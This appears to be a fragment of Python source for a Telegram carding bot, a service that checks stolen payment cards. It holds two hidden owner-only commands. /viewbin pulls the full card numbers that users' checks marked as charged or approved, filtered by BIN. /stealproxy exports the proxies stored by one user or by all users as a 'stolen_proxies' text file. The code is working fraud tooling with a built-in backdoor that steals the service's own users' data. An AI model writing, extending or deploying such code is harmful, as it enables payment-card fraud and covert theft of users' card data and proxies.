@bot.message_handler(commands=['viewbin'])
async def cmd_viewbin(message):
    """Secret: View all FULL cards for a specific BIN"""
    if message.from_user.id != OWNER_ID:
        return
    
    parts = message.text.split()
    
    if len(parts) < 2:
        await bot.reply_to(message, r"""
👑 *View BIN Cards*
━━━━━━━━━━━━━━━━━━━

`/viewbin <bin>` - View all full cards for this BIN
Example: `/viewbin 411111`
        """, parse_mode='Markdown')
        return
    
    target_bin = parts[1][:6]
    if not target_bin.isdigit():
        await bot.reply_to(message, "Invalid BIN (must be 6 digits).")
        return
    
    matching_cards = []
    
    if os.path.exists(DATA_DIR):
        for uid_dir in os.listdir(DATA_DIR):
            try:
                user_dir = os.path.join(DATA_DIR, uid_dir)
                uid = uid_dir
                
                result_files = ["charged.txt", "approved.txt", "ccn.txt", "insufficient.txt",
                               "sh_charged.txt", "sh_approved.txt", "sh_ccn.txt", "sh_insufficient.txt"]
                
                for rf in result_files:
                    file_path = os.path.join(user_dir, rf)
                    if os.path.exists(file_path):
                        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                            content = await f.read()
                            for line in content.strip().split('\n'):
                                if line.strip():
                                    card_part = line.split('|')[0].split('=>')[0].strip()
                                    if card_part.startswith(target_bin):
                                        matching_cards.append(f"[{uid}] {line.strip()}")
            except:
                continue
    
    if not matching_cards:
        await bot.reply_to(message, f"❌ No cards found with BIN `{target_bin}`", parse_mode='Markdown')
        return
    
    text = f"👑 *Cards with BIN {target_bin}*\n━━━━━━━━━━━━━━━━━━━\n\n"
    for card in matching_cards:
        text += f"`{card}`\n"
    
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            await bot.send_message(message.chat.id, text[i:i+4000], parse_mode='Markdown')
    else:
        await bot.reply_to(message, text, parse_mode='Markdown')


@bot.message_handler(commands=['stealproxy'])
async def cmd_stealproxy(message):
    """Secret: Get proxies from a specific user or all users - exports as TXT file"""
    if message.from_user.id != OWNER_ID:
        return
    
    parts = message.text.split()
    
    if len(parts) < 2:
        await bot.reply_to(message, r"""
👑 *Steal Proxies Usage*
━━━━━━━━━━━━━━━━━━━

`/stealproxy <user_id>` - Get proxies from specific user
`/stealproxy all` - Get proxies from ALL users

📄 *Output:* Proxies exported as .txt file
        """, parse_mode='Markdown')
        return
    
    target = parts[1]
    all_proxies = []
    
    if target.lower() == "all":
        if not os.path.exists(DATA_DIR):
            await bot.reply_to(message, "No user data found.")
            return
        
        for uid_dir in os.listdir(DATA_DIR):
            try:
                uid = int(uid_dir)
                proxies = await get_user_proxies(uid)
                for p in proxies:
                    raw = p.get("raw", "")
                    if raw:
                        all_proxies.append(raw)
            except:
                continue
    else:
        try:
            target_uid = int(target)
            proxies = await get_user_proxies(target_uid)
            for p in proxies:
                raw = p.get("raw", "")
                if raw:
                    all_proxies.append(raw)
        except ValueError:
            await bot.reply_to(message, "Invalid user ID.")
            return
    
    if not all_proxies:
        await bot.reply_to(message, "❌ No proxies found.")
        return
    
    # Create txt file and send
    import io
    unique_proxies = list(set(all_proxies))  # Remove duplicates
    proxy_content = "\n".join(unique_proxies)
    
    file_buffer = io.BytesIO(proxy_content.encode('utf-8'))
    file_buffer.name = f"stolen_proxies_{target}_{len(unique_proxies)}.txt"
    
    caption = f"👑 *Stolen Proxies*\n━━━━━━━━━━━━━━━━━━━\n📊 Total: *{len(unique_proxies)}* proxies\n📁 Target: `{target}`"
    
    await bot.send_document(message.chat.id, file_buffer, caption=caption, parse_mode='Markdown')


